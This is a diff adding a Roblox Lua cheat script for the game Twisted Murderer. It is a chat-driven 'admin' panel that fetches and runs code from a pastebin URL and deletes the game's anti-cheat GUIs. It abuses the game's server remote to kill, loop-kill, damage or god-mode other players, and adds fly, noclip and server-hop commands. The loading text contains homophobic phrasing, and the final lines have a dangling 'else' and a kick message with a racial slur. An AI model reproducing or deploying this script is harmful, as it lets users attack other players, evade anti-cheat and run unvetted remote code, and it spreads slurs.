@@ -1,0 +1,994 @@
+local SG = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local chevron_right = Instance.new("ImageButton")
+local chevron_left = Instance.new("ImageButton")
+local UP = Instance.new("ImageLabel")
+local UPSIDE = Instance.new("ImageLabel")
+local DOWN = Instance.new("ImageLabel")
+local DOWNSIDE = Instance.new("ImageLabel")
+local ee = Instance.new("TextLabel")
+local Gradient = Instance.new("ImageLabel")
+local Gradient_2 = Instance.new("ImageLabel")
+ 
+SG.Name = "SG"
+SG.Parent = game.CoreGui
+SG.Enabled = true
+SG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = SG
+Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Size = UDim2.new(1, 0, 1, 0)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.40625, 0, 0.461180121, 0)
+TextLabel.Size = UDim2.new(0, 300, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Loading"
+TextLabel.TextColor3 = Color3.new(1, 1, 1)
+TextLabel.TextSize = 30
+TextLabel.TextWrapped = true
+
+chevron_right.Name = "chevron_right"
+chevron_right.Parent = SG
+chevron_right.BackgroundTransparency = 1
+chevron_right.Position = UDim2.new(0.426874995, 0, 0.479813665, 0)
+chevron_right.Size = UDim2.new(0, 31, 0, 31)
+chevron_right.ZIndex = 2
+chevron_right.Image = "rbxassetid://3926305904"
+chevron_right.ImageRectOffset = Vector2.new(924, 884)
+chevron_right.ImageRectSize = Vector2.new(36, 36)
+
+chevron_left.Name = "chevron_left"
+chevron_left.Parent = SG
+chevron_left.BackgroundTransparency = 1
+chevron_left.Position = UDim2.new(0.551249981, 0, 0.479813665, 0)
+chevron_left.Size = UDim2.new(0, 31, 0, 31)
+chevron_left.ZIndex = 2
+chevron_left.Image = "rbxassetid://3926305904"
+chevron_left.ImageRectOffset = Vector2.new(124, 924)
+chevron_left.ImageRectSize = Vector2.new(36, 36)
+
+UP.Name = "UP"
+UP.Parent = SG
+UP.Active = true
+UP.BackgroundColor3 = Color3.new(1, 1, 1)
+UP.BackgroundTransparency = 1
+UP.BorderSizePixel = 0
+UP.Position = UDim2.new(0.323125005, 0, 0.315217376, 0)
+UP.Selectable = true
+UP.Size = UDim2.new(0, 256, 0, 2)
+UP.Image = "http://www.roblox.com/asset/?id=4499757638"
+
+UPSIDE.Name = "UPSIDE"
+UPSIDE.Parent = UP
+UPSIDE.Active = true
+UPSIDE.BackgroundColor3 = Color3.new(1, 1, 1)
+UPSIDE.BackgroundTransparency = 1
+UPSIDE.BorderSizePixel = 0
+UPSIDE.Position = UDim2.new(-0.00234374404, 0, -0.184782624, 0)
+UPSIDE.Selectable = true
+UPSIDE.Size = UDim2.new(0, 2, 0, 94)
+UPSIDE.Image = "http://www.roblox.com/asset/?id=4499757638"
+
+DOWN.Name = "DOWN"
+DOWN.Parent = SG
+DOWN.Active = true
+DOWN.BackgroundColor3 = Color3.new(1, 1, 1)
+DOWN.BackgroundTransparency = 1
+DOWN.BorderSizePixel = 0
+DOWN.Position = UDim2.new(0.501249969, 0, 0.690993786, 0)
+DOWN.Selectable = true
+DOWN.Size = UDim2.new(0, 256, 0, 2)
+DOWN.Image = "http://www.roblox.com/asset/?id=4499757638"
+
+DOWNSIDE.Name = "DOWNSIDE"
+DOWNSIDE.Parent = DOWN
+DOWNSIDE.Active = true
+DOWNSIDE.BackgroundColor3 = Color3.new(1, 1, 1)
+DOWNSIDE.BackgroundTransparency = 1
+DOWNSIDE.BorderSizePixel = 0
+DOWNSIDE.Position = UDim2.new(0.997656226, 0, -46.1847839, 0)
+DOWNSIDE.Selectable = true
+DOWNSIDE.Size = UDim2.new(0, 2, 0, 94)
+DOWNSIDE.Image = "http://www.roblox.com/asset/?id=4499757638"
+
+ee.Name = "ee"
+ee.Parent = SG
+ee.BackgroundColor3 = Color3.new(1, 1, 1)
+ee.BackgroundTransparency = 1
+ee.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+ee.BorderSizePixel = 0
+ee.Position = UDim2.new(0.53687501, 0, 0.694099367, 0)
+ee.Size = UDim2.new(0, 200, 0, 50)
+ee.Font = Enum.Font.SourceSans
+ee.Text = "Script by 666Zvck // woah#1444"
+ee.TextColor3 = Color3.new(1, 0.666667, 1)
+ee.TextSize = 14
+
+Gradient.Name = "Gradient"
+Gradient.Parent = SG
+Gradient.Active = true
+Gradient.BackgroundColor3 = Color3.new(1, 1, 1)
+Gradient.BackgroundTransparency = 1
+Gradient.BorderSizePixel = 0
+Gradient.Position = UDim2.new(0.419999957, 0, 0.538819909, 0)
+Gradient.Selectable = true
+Gradient.Size = UDim2.new(0, 256, 0, 2)
+Gradient.Image = "http://www.roblox.com/asset/?id=4499757638"
+
+Gradient_2.Name = "Gradient"
+Gradient_2.Parent = SG
+Gradient_2.Active = true
+Gradient_2.BackgroundColor3 = Color3.new(1, 1, 1)
+Gradient_2.BackgroundTransparency = 1
+Gradient_2.BorderSizePixel = 0
+Gradient_2.Position = UDim2.new(0.419999957, 0, 0.460000008, 2)
+Gradient_2.Selectable = true
+Gradient_2.Size = UDim2.new(0, 256, 0, 2)
+Gradient_2.Image = "http://www.roblox.com/asset/?id=4499757638"
+
+
+
+TextLabel.Text = 'Loading.'
+wait(.9)
+TextLabel.Text = 'Loading..'
+wait(.9)
+TextLabel.Text = 'Loading...'
+wait(.9)
+TextLabel.Text = 'Adding gay shit.'
+wait(.9)
+    loadstring(game:HttpGet(('https://pastebin.com/raw/XHLUdbHF'),true))()
+wait(2)
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("", Color3.new(0,255,0))
+_G.SendTMMessage("[Xi$tence]: Welcome to Xi$tences Twisted Murderer Admin!", Color3.new(0,55,120))
+wait(.5)
+_G.SendTMMessage("[Xi$tence]: gang shit XD", Color3.new(0,55,120))
+TextLabel.Text = 'Adding gay shit..'
+wait(.9)
+TextLabel.Text = 'Loaded!'
+wait(.9)
+TextLabel.Text = 'Press T to close!'
+wait(.9)
+
+local mouse = game.Players.LocalPlayer:GetMouse()
+mouse.KeyDown:connect(function(t)	
+	if t == "t" then
+SG:Destroy()
+end
+	end)
+
+
+local gPlayers = game:GetService("Players")
+local admin = game.Players.LocalPlayer.Name
+local bannedplayers = {""}
+
+local admins = {"Friend, Friend"}
+
+local services = {}
+local cmds = {}
+local std = {}
+
+local serverLocked = false
+
+function FIX_LIGHTING()
+    game.Lighting.Ambient = Color3.new(0.5, 0.5, 0.5)
+    game.Lighting.Brightness = 1
+    game.Lighting.GlobalShadows = true
+    game.Lighting.Outlines = false
+    game.Lighting.TimeOfDay = 14
+    game.Lighting.FogEnd = 100000
+	end
+
+	services.players = gPlayers
+	services.lighting = game:GetService("Lighting")
+	services.workspace = game:GetService("Workspace")
+	services.events = {}
+	local user = gPlayers.LocalPlayer
+	
+	local tprefix = ""
+	local scriptprefix = ""
+	local split = " "
+
+	for i, v in pairs(game.CoreGui:GetDescendants()) do
+	    if v:IsA("TextLabel") and v.Text == "XVA Admin" then
+	        print(v:GetFullName())
+	    end
+	end
+	
+	local updateevents = function()
+	    for i, v in pairs(services.events) do
+	        services.events:remove(i)
+	        v:disconnect()
+	    end
+	    for i, v in pairs(gPlayers:players()) do
+	        local ev =
+	            v.Chatted:connect(
+	            function(msg)
+	                do_exec(msg, v)
+	            end
+	        )
+	        services.events[#services.events + 1] = ev
+	    end
+	end
+
+	std.inTable = function(tbl, val)
+	    if tbl == nil then
+	        return false
+	    end
+	
+	    for _, v in pairs(tbl) do
+	        if v == val then
+	            return true
+	        end
+	    end
+	    return false
+	end
+	
+	std.out = function(str)
+	    print(str)
+	end
+	
+	std.list = function(tbl)
+	    local str = ""
+	    for i, v in pairs(tbl) do
+	        str = str .. tostring(v)
+	        if i ~= #tbl then
+	            str = str .. ", "
+	        end
+	    end
+	    return str
+	end
+	
+	std.endat = function(str, val)
+	    local z = str:find(val)
+	    if z then
+	        return str:sub(0, z - string.len(val)), true
+	    else
+	        return str, false
+	    end
+	end
+	
+	std.first = function(str)
+	    return str:sub(1, 1)
+	end
+	
+	local isAdmin = function(name)
+	    if name == admin then
+	        return true
+	    elseif admins[name] == true then
+	        return true
+	    end
+	    return false
+	end
+	
+	local exec = function(str)
+	    spawn(
+	        function()
+	            local script, loaderr = loadstring(str)
+	            if not script then
+	                error(loaderr)
+	            else
+	                script()
+	            end
+	        end
+	    )
+	end
+	
+	local findCmd = function(cmd_name)
+	    for i, v in pairs(cmds) do
+	        if v.NAME:lower() == cmd_name:lower() or std.inTable(v.ALIAS, cmd_name:lower()) then
+	            return v
+	        end
+	    end
+	end
+	
+	local getCmd = function(msg)
+	    local cmd, hassplit = std.endat(msg:lower(), split)
+	    if hassplit then
+	        return {cmd, true}
+	    else
+	        return {cmd, false}
+	    end
+	end
+	
+	local getprfx = function(strn)
+	    if strn:sub(1, string.len(tprefix)) == tprefix then
+	        return {"cmd", string.len(tprefix) + 1}
+	    elseif strn:sub(1, string.len(scriptprefix)) == scriptprefix then
+	        return {"exec", string.len(scriptprefix) + 1}
+	    end
+	    return
+	end
+	
+	local getArgs = function(str)
+	    local args = {}
+	    local new_arg = nil
+	    local hassplit = nil
+	    local s = str
+	    repeat
+	        new_arg, hassplit = std.endat(s:lower(), split)
+	        if new_arg ~= "" then
+	            args[#args + 1] = new_arg
+	            s = s:sub(string.len(new_arg) + string.len(split) + 1)
+	        end
+	    until hassplit == false
+	    return args
+	end
+	
+	local function execCmd(str, plr)
+	    local s_cmd
+	    local a
+	    local cmd
+	    s_cmd = getCmd(str) --separate command from string using split {command name,arg bool (for arg system)}
+	    cmd = findCmd(s_cmd[1]) --get command object {NAME,DESC,{ALIASES},function(args)}
+	    if cmd == nil then
+	        return
+	    end
+	    a = str:sub(string.len(s_cmd[1]) + string.len(split) + 1)
+	     --start string "a" after command and split
+	    local args = getArgs(a)
+	     --gets us a nice table of arguments
+	
+	    pcall(
+	        function()
+	            cmd.FUNC(args, plr)
+	        end
+	    )
+	end
+	
+	function do_exec(str, plr)
+	    if not isAdmin(plr.Name) then
+	        return
+	    end
+	
+	    str = str:gsub("/e ", "") --remove "/e " the easy way!
+	
+	    local t = getprfx(str)
+	    if t == nil then
+	        return
+	    end
+	    str = str:sub(t[2])
+	    if t[1] == "exec" then
+	        exec(str)
+	    elseif t[1] == "cmd" then
+	        execCmd(str, plr)
+	    end
+	end
+	
+	updateevents()
+_G.exec_cmd = execCmd
+	--game.Players.LocalPlayer.Chatted:connect(doexec)
+	
+	local _char = function(plr_name)
+	    for i, v in pairs(game.Players:GetChildren()) do
+	        if v:IsA "Player" then
+	            if v.Name == plr_name then
+	                return v.Character
+	            end
+	        end
+	    end
+	    return
+	end
+	
+	local _plr = function(plr_name)
+	    for i, v in pairs(game.Players:GetChildren()) do
+	        if v:IsA "Player" then
+	            if v.Name == plr_name then
+	                return v
+	            end
+	        end
+	    end
+	    return
+	end
+	
+	function addcmd(name, desc, alias, func)
+	    cmds[#cmds + 1] = {
+	        NAME = name,
+	        DESC = desc,
+	        ALIAS = alias,
+	        FUNC = func
+	    }
+	end
+	
+	local function getPlayer(name)
+	    local nameTable = {}
+	    name = name:lower()
+	    if name == "me" then
+	        return {admin}
+	    elseif name == "others" then
+	        for i, v in pairs(gPlayers:GetChildren()) do
+	            if v:IsA "Player" then
+	                if v.Name ~= admin then
+	                    nameTable[#nameTable + 1] = v.Name
+	                end
+	            end
+	        end
+	    elseif name == "all" then
+	        for i, v in pairs(gPlayers:GetChildren()) do
+	            if v:IsA "Player" then
+	                nameTable[#nameTable + 1] = v.Name
+	            end
+	        end
+	    else
+	        for i, v in pairs(gPlayers:GetChildren()) do
+	            local lname = v.Name:lower()
+	            local i, j = lname:find(name)
+	            if i == 1 then
+	                return {v.Name}
+	            end
+	        end
+	    end
+	    return nameTable
+	end
+local a =
+	setmetatable(
+	    {},
+	    {__index = function(b, c)
+	            return game:service(c)
+	        end}
+	)
+local d = {"AntiSpeedHack", "AntiDataTheft", "UI", "NO FF"}
+local e = a.Players.LocalPlayer
+local f = {}
+function NoAnti()
+    spawn(
+        function()
+            a.RunService.RenderStepped:wait()
+            for g, h in pairs(f) do
+                h:remove()
+                f[g] = nil
+            end
+            for g, h in pairs(e.PlayerGui:GetChildren()) do
+                for g, b in pairs(d) do
+                    if b == h.Name then
+                        h:remove()
+                    end
+                end
+            end
+        end
+    )
+end
+NoAnti()
+
+addcmd(
+    "god",
+    "gods the choosen player",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        NoAnti()
+        for i, v in pairs(players) do
+            if gPlayers[v]:FindFirstChild("god") then
+                gPlayers[v]:FindFirstChild("god"):Destroy()
+            end
+            local god = Instance.new("BoolValue")
+            god.Parent = gPlayers[v]
+            god.Value = true
+            god.Name = "god"
+
+            game:GetService("RunService").RenderStepped:connect(
+                function()
+                    if gPlayers[v]:FindFirstChild("god") then
+                        game.ReplicatedStorage.Event:FireServer(
+                            "TPD",
+                            -math.huge ^ 1.45,
+                            gPlayers[v].Character:FindFirstChild("Humanoid")
+                        )
+                        game.ReplicatedStorage.Event:FireServer(
+                            "TPD",
+                            math.huge,
+                            gPlayers[v].Character and gPlayers[v].Character:FindFirstChild "Humanoid" or
+                                gPlayers[v].CharacterAdded:wait():FindFirstChild("Humanoid")
+                        )
+                    end
+                end
+            )
+        end
+    end
+)
+
+addcmd(
+    "ungod",
+    "ungods the choosen player",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        for i, v in pairs(players) do
+            if gPlayers[v]:FindFirstChild("god") then
+                gPlayers[v]:FindFirstChild("god"):Destroy()
+game.ReplicatedStorage.Event:FireServer("TPD", math.huge, gPlayers[v].Character.Humanoid)
+            end
+        end
+    end
+)
+
+addcmd(
+    "loopgod",
+    "loopgods the choosen player",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        NoAnti()
+        for i, v in pairs(players) do
+            game:GetService("RunService").RenderStepped:connect(
+                function()
+				game.RunService.Stepped:wait()
+                    game.ReplicatedStorage.Event:FireServer(
+                        "TPD",
+                        -math.huge ^ 1.45,
+                        gPlayers[v].Character:FindFirstChild("Humanoid")
+                    )
+                    game.ReplicatedStorage.Event:FireServer(
+                        "TPD",
+                        math.huge,
+                        gPlayers[v].Character and gPlayers[v].Character:FindFirstChild "Humanoid" or
+                            gPlayers[v].CharacterAdded:wait():FindFirstChild("Humanoid")
+                    )
+                end
+            )
+        end
+    end
+)
+
+addcmd(
+    "radio",
+    "plays an audio",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        if not args[1] or not args[2] then
+            return
+        end
+        local num = args[2]
+        for i, v in pairs(players) do
+            game.ReplicatedStorage.Event:FireServer("PlayRadio", gPlayers[v], num)
+        end
+    end
+)
+
+addcmd(
+    "to",
+    "teleports you to the choosen player",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        if players ~= nil and _char(players[1]):FindFirstChild("HumanoidRootPart") then
+            _char(admin).HumanoidRootPart.CFrame = _char(players[1]).HumanoidRootPart.CFrame
+        end
+    end
+)
+
+addcmd(
+    "kill",
+    "destroys the breakjoins of the chosen player",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        for i, v in pairs(players) do
+            game.ReplicatedStorage.Event:FireServer("TPD", math.huge, gPlayers[v].Character.Humanoid)
+        end
+    end
+)
+
+addcmd(
+    "dmg",
+    "destroys the # of the amount that the player typed",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        if not args[1] or not args[2] then
+            return
+        end
+        local num = args[2]
+        for i, v in pairs(players) do
+            game.ReplicatedStorage.Event:FireServer("TPD", num, gPlayers[v].Character.Humanoid)
+        end
+    end
+)
+
+addcmd(
+    "heal",
+    "gives back num% of the of the damaged health from the choosen player",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+      	if not args[1] or not args[2] then
+            return
+        end
+        local num = args[2]
+			NoAnti()
+        for i, v in pairs(players) do
+            game.ReplicatedStorage.Event:FireServer("TPD", -num, gPlayers[v].Character.Humanoid)
+        end
+    end
+)
+
+addcmd(
+    "view",
+    "view's the choosen player",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        workspace.CurrentCamera.CameraSubject = game.Players[players[1]].Character
+    end
+)
+
+addcmd(
+    "lk",
+    "requires at least lower then 100 ping or below",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        for i, v in pairs(players) do
+            if gPlayers[v]:FindFirstChild("fasterloop") then
+                gPlayers[v]:FindFirstChild("fasterloop"):Destroy()
+            end
+            local fasterloop = Instance.new("BoolValue")
+            fasterloop.Parent = gPlayers[v]
+            fasterloop.Value = true
+            fasterloop.Name = "fasterloop"
+            game:GetService("RunService").RenderStepped:connect(
+                function()
+				game.RunService.Stepped:wait()
+                    if gPlayers[v]:FindFirstChild("fasterloop") then
+                        local s =
+                            game:GetService("Players"):FindFirstChild(gPlayers[v].Name).Character:FindFirstChild(
+                            "Humanoid"
+                        )
+                        game.ReplicatedStorage.Event:FireServer("TPD", math.huge, s)
+                    end
+                end
+            )
+        end
+    end
+)
+addcmd(
+    "unlk",
+    "unloops the choosen player",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        for i, v in pairs(players) do
+            if gPlayers[v]:FindFirstChild("fasterloop") then
+                gPlayers[v]:FindFirstChild("fasterloop"):Destroy()
+            end
+        end
+    end
+)
+
+addcmd(
+    "loopkill",
+    "loopkills the choosen person",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        for i, v in pairs(players) do
+            game:GetService("RunService").RenderStepped:connect(
+                function()
+				game.RunService.Stepped:wait()
+                    local s =
+                        game:GetService("Players"):WaitForChild(gPlayers[v].Name).Character:FindFirstChild("Humanoid")
+                    game.ReplicatedStorage.Event:FireServer("TPD", math.huge, s)
+                end
+            )
+        end
+    end
+)
+addcmd(
+    "cmds",
+    "shows the list for admin commands",
+    {},
+    function(args)
+print([[
+
+      
+      ------------------------------------------------------------
+      -- radio (name)(me, others, all work too!) (audio id)
+      -- Kill (name)
+      -- Loopkill(name)
+      -- Lk (name)
+      -- Unlk (name)
+      -- God (name)
+      -- Ungod (name) 
+      -- dmg (name) (number 1-100)
+      -- heal (name) (number 1-100)
+      -- cloak (name) 
+      -- fly (localplayer only)
+      -- unfly (localplayer only)
+      -- noclip (localplayer only)
+      -- ws (localplayer only)
+      -- clip (localplayer only)
+      -- view (name)
+      -- shiftlock (localplayer only)
+      -- Rejoin (localplayer only)
+      -- leave (localplayer only)
+      ------------------------------------------------------------------------------]])
+end)
+	
+addcmd(
+    "cloak",
+    "makes the chosen invisible",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        for i, v in pairs(players) do
+            local workspacep = game.Workspace.Ignore.Players
+            local audio = workspacep:FindFirstChild(players[1])
+            game.ReplicatedStorage.Event:FireServer("Cloak", audio)
+        end
+    end
+)
+addcmd(
+    "Ws",
+    "changes the localplayer walkspeed",
+    {},
+    function(args)
+        local players = getPlayer(args[1])
+        if not args[1] or not args[2] then
+            return
+        end
+        local num = args[2]
+        for i, v in pairs(players) do
+            if _char(v):FindFirstChild("Humanoid") then
+                _char(v).Humanoid.WalkSpeed = tonumber(num)
+            end
+        end
+    end
+)
+addcmd(
+    "Add",
+    "lets a player use your admin commands",
+    {},
+    function(args)
+        if not args[1] then
+            return
+        end
+        local players = getPlayer(args[1])
+        table.foreach(
+            players,
+            function(k, v)
+                admins[v] = true
+            end
+        )
+    end
+)
+
+addcmd(
+	"fly",
+	"makes the localplayer fly",
+{},
+	function(args)
+local mouse = game.Players.LocalPlayer:GetMouse ""
+local localplayer = game.Players.LocalPlayer
+game.Players.LocalPlayer.Character:WaitForChild("Torso")
+local torso = game.Players.LocalPlayer.Character.Torso
+local flying = true
+local speed = 5
+local keys = {a = false, d = false, w = false, s = false}
+local e1
+local e2
+local function start()
+local pos = Instance.new("BodyPosition", torso)
+local gyro = Instance.new("BodyGyro", torso)
+pos.Name = "EPIXPOS"
+pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
+pos.position = torso.Position
+gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+gyro.cframe = torso.CFrame
+function NoFly()
+flying = false
+if gyro then
+gyro:Destroy()
+end
+if pos then
+pos:Destroy()
+end
+localplayer.Character.Humanoid.PlatformStand = false
+speed = 0
+end
+repeat
+wait()
+localplayer.Character.Humanoid.PlatformStand = true
+local new = gyro.cframe - gyro.cframe.p + pos.position
+if not keys.w and not keys.s and not keys.a and not keys.d then
+speed = 1
+end
+if keys.w then
+new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+speed = speed + 0.05
+end
+if keys.s then
+new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+speed = speed + 0.03
+end
+if keys.d then
+new = new * CFrame.new(speed, 0, 0)
+speed = speed + 0.02
+end
+if keys.a then
+new = new * CFrame.new(-speed, 0, 0)
+speed = speed + 0.03
+end
+if speed > 3 then
+speed = 3
+end
+pos.position = new.p
+if keys.w then
+gyro.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad(speed * 6), 0, 0)
+elseif keys.s then
+gyro.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(math.rad(speed * 5), 0, 0)
+else
+gyro.cframe = workspace.CurrentCamera.CoordinateFrame
+end
+until flying == false
+NoAnti()
+flying = false
+if gyro then
+gyro:Destroy()
+end
+if pos then
+pos:Destroy()
+end
+localplayer.Character.Humanoid.PlatformStand = false
+speed = 0
+end
+e1 = mouse.KeyDown:connect(function(key)
+if not torso or not torso.Parent then
+flying = false
+e1:disconnect()
+e2:disconnect()
+return
+end
+if key == "w" then
+keys.w = true
+elseif key == "s" then
+keys.s = true
+elseif key == "a" then
+keys.a = true
+elseif key == "d" then
+keys.d = true
+elseif key == "p" then
+keys.d = true
+end
+e2 = mouse.KeyUp:connect(function(key)
+if key == "w" then
+keys.w = false
+elseif key == "s" then
+keys.s = false
+elseif key == "a" then
+keys.a = false
+elseif key == "d" then
+keys.d = false
+end
+start()
+end)
+end)
+end)
+
+addcmd(
+    "unfly",
+    "makes localplayer fly",
+    {},
+    function(args)
+        NoFly()
+    end
+)
+
+-- Local Commands
+addcmd(
+    "rejoin",
+    "makes the localplayer rejoin hopefully quicker",
+    {},
+    function(args)
+        game:GetService("TeleportService"):Teleport(game.PlaceId)
+    end
+)
+
+addcmd(
+    "leave",
+    "shutdowns the localplayer game",
+    {},
+    function(args)
+        game:Shutdown()
+    end
+)
+	
+addcmd(
+    "reset",
+    "kills the localplayer even through if you're still goded",
+    {},
+    function(args)
+        game.Players.LocalPlayer.Character:BreakJoints()
+    end
+)
+
+addcmd(
+    "shiftlock",
+    "enables shiftlock",
+    {},
+    function(args)
+        game.Players.LocalPlayer.DevEnableMouseLock = true
+    end
+)
+
+local Player = game.Players.LocalPlayer
+Player.Chatted:connect(
+    function(cht)
+        if cht:match(tprefix .. "noclip") then
+            local function noclip(plr)
+                local admintag = Instance.new("BoolValue")
+                admintag.Parent = game.Players[plr]
+                admintag.Value = true
+                admintag.Name = "noclip"
+            end
+            if game.Players.LocalPlayer:FindFirstChild("noclip") then
+                game.Players.LocalPlayer.noclip:Destroy()
+            end
+            noclip(game.Players.LocalPlayer.Name)
+            game:GetService("RunService").Stepped:connect(
+                function()
+                    if game.Players.LocalPlayer:FindFirstChild("noclip") then
+                        game.Players.LocalPlayer.Character.Head.CanCollide = false
+                        game.Players.LocalPlayer.Character.Torso.CanCollide = false
+                    end
+                end
+            )
+        end
+    end
+)
+
+Player.Chatted:connect(
+    function(cht)
+        if cht:match(tprefix .. "clip") then
+            game.Players.LocalPlayer.noclip:Destroy()
+        end
+    end
+)
+
+Player.Chatted:connect(function(cht)
+if cht:match(tprefix.."serverhop") then
+local PlaceId = game.PlaceId
+local URL = ("https://www.roblox.com/games/getgameinstancesjson?placeId=%s&startindex="):format(PlaceId)
+
+local List = {}
+
+for page = 0, 30 do
+    local Query = game:GetService("HttpService"):JSONDecode(game:HttpGet(URL .. page))
+
+    for i, v in next, Query.Collection do
+        List[v.Guid] = v.Ping
+    end
+end
+
+local ChosenServer = game.JobId
+
+for i, v in pairs(List) do
+    if i ~= game.JobId then
+        ChosenServer = i
+        break
+    end
+end
+
+game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceId, ChosenServer, game.Players.LocalPlayer) end; end); -- Undented Ends -- Stops here
+else
+	game.Players.LocalPlayer:Kick("NIGGERXD")
+end
